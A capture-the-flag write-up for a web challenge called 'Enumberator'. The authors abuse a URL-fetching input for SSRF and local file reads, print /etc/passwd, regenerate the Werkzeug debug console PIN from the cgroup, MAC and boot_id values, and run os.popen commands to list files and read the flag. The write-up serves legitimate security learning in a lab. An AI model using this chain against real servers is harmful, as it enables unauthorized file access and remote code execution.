# Enumberator

Opeing this page with a browser showed a page with a single input box.

we speculated that the server would make a web request to the page when we clicked the button on the page.

To verify this we entered `http://localhost:9002/` in the input box and hit enter.

The result was the page being loaded twice.

This potentially useful as it provided a way of accessing the server on a different
port by making queries to localhost on different ports.  Normally we would be unable to do this as we could only access the machine on `http://192.168.125.100:9002/`

The next discovery came from enetering invalid value for the url. This sent us to a `Werkzeug  traceback interpreter`.

looking at the error we saw that if the string `file` was within the provided url then the server would attemt to open a file rather than making a network request.

This was useful as it allowed us to see the server's internal state.

One of the first things we looked at was the passwd file

```
root:x:0/:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
```

Since only the root user had a shell and we had permission to access the passwd
 file , we speculated that the server was being run as root.

This was still not too helpful as although we could read any file on the system
 we still couldn't see the flag and we were unable to list files or run any other commands.

Researching `Werkzeug` further, we realised that it should be possible to access
 a python console. However navigating to `http://192.168.125.100:9002/console` gave us a request for a pin.

To identify what the pin was we looked at the the source of werkzeug - in
particular the `__init__.py` file.

We  saw that the `cgroup`, MAC address and `boot_id` were used to generate the pin.

Using the trick from earlier we were able to access files containing these values.

next we copied the contents of __init__.py to a file called `fakeinit.py` and
substituded the values for the cgroup, MAC address and boot_id, as well as some
other values which we were able to make infomed guessed about - such as the
 username wich we guessed to be root.

Executing this script gave us a pin:
  
```sh
python ./3-enumerator/fakeinit.py
('100-862-562', '__wzdb3546933b40f098f5b74')
```

We then entered this pin into Werkzeug  and we were able to access a python console.

To get the flag we ran the following command:

```python
import os
stream = os.popen("ls -la")
stream.read()
```
This gave us a directory listing:

```
total 20
drwxr-xr-x    1 root     root          4096 Mar 30 19:09 .
drwxr-xr-x    1 root     root          4096 Apr  1 11:57 ..
-rw-r--r--    1 root     root          1359 Mar 30 18:57 enumerator.py
-rw-r--r--    1 root     root            41 Mar 30 18:57 jthnp_flag_ohvlt.txt
-rw-r--r--    1 root     root           183 Mar 30 18:57 requirements.txt
```

Clearly the flag was in the `jthnp_flag_ohvlt.txt` file.

Accessing it was simply a matter of doing
```python
stream = os.popen("cat jthnp_flag_ohvlt.txt")
stream.read()
```

Which gave us the flag of `ICTF{th3_fl4g_w4s_h1d1ng_1n_pl41n_s1ght}`